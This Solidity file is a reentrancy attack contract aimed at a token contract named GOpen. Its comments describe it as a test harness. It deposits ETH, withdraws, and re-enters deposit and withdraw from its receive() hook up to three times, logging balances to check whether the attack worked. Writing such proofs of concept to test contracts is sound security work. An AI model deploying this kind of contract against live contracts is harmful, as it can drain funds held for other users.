// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

interface IGOpen {
    function deposit() external payable;
    function withdraw(uint256 amt) external;
    function balanceOf(address account) external view returns (uint256);
}

/**
 * @title ReentrancyAttacker
 * @dev Contract to test reentrancy attack on GOpen token
 */
contract ReentrancyAttackerGOPEN {
    IGOpen public immutable gopen;
    uint256 public attackCount;
    uint256 public maxAttacks = 3;
    bool public attacking = false;
    
    // Track balances for analysis
    uint256 public initialEthBalance;
    uint256 public initialTokenBalance;
    uint256 public finalEthBalance;
    uint256 public finalTokenBalance;
    
    constructor(address _gopen) {
        gopen = IGOpen(_gopen);
    }
    
    // Function to start the attack
    function startAttack() external payable {
        require(msg.value > 0, "Need ETH to start attack");
        require(!attacking, "Attack already in progress");
        
        attacking = true;
        attackCount = 0;
        
        // Record initial state
        initialEthBalance = address(this).balance;
        initialTokenBalance = gopen.balanceOf(address(this));
        
        // Step 1: Deposit ETH to get tokens
        gopen.deposit{value: msg.value}();
        
        // Step 2: Try to withdraw and trigger reentrancy
        uint256 tokenBalance = gopen.balanceOf(address(this));
        if (tokenBalance > 0) {
            gopen.withdraw(tokenBalance);
        }
    }
    
    // This function will be called when GOpen sends ETH back
    receive() external payable {
        attackCount++;
        
        if (attacking && attackCount < maxAttacks) {
            // Try to re-enter by depositing the received ETH
            try gopen.deposit{value: msg.value}() {
                // If deposit succeeds, try to withdraw again
                uint256 newTokenBalance = gopen.balanceOf(address(this));
                if (newTokenBalance > 0) {
                    gopen.withdraw(newTokenBalance);
                }
            } catch {
                attacking = false;
            }
        } else {
            // Attack finished
            finalEthBalance = address(this).balance;
            finalTokenBalance = gopen.balanceOf(address(this));
            attacking = false;
        }
    }
    
    // Helper functions for testing
    function getAttackResults() external view returns (
        uint256 _initialEth,
        uint256 _initialTokens,
        uint256 _finalEth,
        uint256 _finalTokens,
        uint256 _attackCount,
        bool _wasAttacking
    ) {
        return (
            initialEthBalance,
            initialTokenBalance,
            finalEthBalance,
            finalTokenBalance,
            attackCount,
            attacking
        );
    }
    
    function resetAttack() external {
        attacking = false;
        attackCount = 0;
    }
    
    // Function to withdraw any remaining ETH (for cleanup)
    function withdrawAll() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}